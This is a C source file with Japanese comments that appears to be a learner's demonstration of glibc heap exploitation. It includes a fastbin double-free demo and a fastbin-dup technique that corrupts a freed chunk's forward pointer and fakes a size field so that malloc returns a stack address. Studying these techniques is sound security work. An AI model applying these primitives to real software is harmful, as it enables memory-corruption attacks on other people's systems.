#include<stdio.h>
#include<stdlib.h>

/*
void sh(void* p){ //show header
  printf("position .. %p\n",p);
  printf("prev_size .. %p\n",*(void**)(p-psize*2));
  printf("size .. %p\n",(void*)((unsigned long)(*(void**)(p-psize)) & (~0x7)));
  unsigned long xx=*(void**)(p-psize);
  int x = xx & 7;
  printf("isnot_main_arena? %d mmaped? %d prev_inuse? %d\n",(x>>2)&1,(x>>1)&1,x&1);
  printf("fd .. %p\n",*(void**)(p) + psize*2);
  printf("bk .. %p\n",*(void**)(p+psize) + psize*2);
  //fd,bkはprev_sizeの位置を指す
  printf("fd_size .. %p\n",*(void**)(p+psize*2));
  printf("bk_size .. %p\n",*(void**)(p+psize*3));
  puts("");
}
*/

const int psize = sizeof(void*);

void sh(void* p){ //show header
  printf("position .. %p\n",p);
  printf("prev_size .. %p\n",*(void**)(p-psize*2));
  printf("size .. %p\n",(void*)((unsigned long)(*(void**)(p-psize)) & (~0x7)));
  char x=(*(char*)(p-psize)) & 7;
  printf("isnot_main_arena? %d mmaped? %d prev_inuse? %d\n",(x>>2)&1,(x>>1)&1,x&1);
  printf("fd .. %p\n",*(void**)(p) + psize*2);
  printf("bk .. %p\n",*(void**)(p+psize) + psize*2);
  //fd,bkはprev_sizeの位置を指す
  printf("fd_size .. %p\n",*(void**)(p+psize*2));
  printf("bk_size .. %p\n",*(void**)(p+psize*3));
  puts("");
}


void fastbins_dup(){
  void *a,*b,*c;
  a = malloc(28);
  b = malloc(28);
  c = malloc(28);
  free(a); free(b); free(a);
  sh(a);
  sh(b);
  sh(c);
  printf("この後、a,bが交互にmallocで返ってくる\n");
  sh(malloc(28));

  sh(malloc(28));
  sh(malloc(28));
  sh(malloc(28));
  sh(malloc(28));

  printf("今、bが返ろうとしているが、ここでbのsizeの位置をいじるとerrorになって落ちる\n");
  *(unsigned int*)(b-psize) = 0xbeef;
  sh(b);
  malloc(28);
}

void fastbins_dup_and_get_arbitrary_address_from_malloc(){
  //void* hoge; 
 
  void *a,*b,*c;
  a = malloc(28);
  b = malloc(28);
  c = malloc(28);
  free(a); free(b); free(a);
  sh(a);
  /*
  char* hoge; //スタックの真上だとスタックフレーム外になってバグって死ぬ 
  char huga[100];
  huga[99]=1;
  hoge = huga+50;
  printf("hogeのアドレス.. %p\n",hoge); 
  c = malloc(28); malloc(28);
  *(void**)c =  (hoge-16);
  //hoge = 0xcafeba;
  //printf("%p %p %p %p\n",(hoge)-1,hoge,hoge+1,psize);
  //ちょうどvoid*ポインタ一個分。  
  *(unsigned long*)(hoge-8) = 32 + psize*2; //not_main_arenaのビットが立ってると落ちる!!(それもassertではなくセグフォで)
  //8の倍数なので28ではなく32.
  */
  char hoge[10]; 
  printf("hogeのアドレス.. %p\n",hoge); 
  c = malloc(28); malloc(28);
  *(void**)c = hoge-16; //char16個分がvoid*2個分
  //ちょうどvoid*ポインタ一個分。  
  *(unsigned long*)(hoge-8) = 32 + psize*2; 
  sh(hoge);
  malloc(28); 
  printf("mallocからhogeのアドレスが返ってくる .. %p\n",malloc(28));   
}

  
void main(){
  fastbins_dup_and_get_arbitrary_address_from_malloc();
  //fastbins_dup();  
}
